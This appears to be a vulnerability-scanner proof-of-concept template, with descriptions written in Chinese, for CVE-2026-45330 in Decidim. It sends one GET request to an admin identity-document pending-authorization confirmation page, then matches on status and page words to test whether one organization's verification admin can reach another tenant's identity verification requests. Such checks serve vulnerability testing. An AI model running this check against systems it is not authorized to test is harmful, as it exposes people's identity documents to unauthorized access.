[info]
author = "ave"
description = "验证 Decidim 验证管理员能否跨组织访问其他租户的身份文档验证请求。通过以组织A的验证管理员身份访问组织B的授权确认页，判断是否存在越权。"
id = "POC-AVE-2026-0277"
name = "Decidim 验证管理员跨组织越权身份信息访问 PoC"
severity = "medium"
tags = ["ave-2026-0277"]
vuln_id = [
    "CVE-2026-45330",
    "AVE-2026-0277",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin/id_documents/pending_authorizations/{{auth_id}}/confirmations/new"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "pending_authorization",
    "confirm",
    "reject",
]
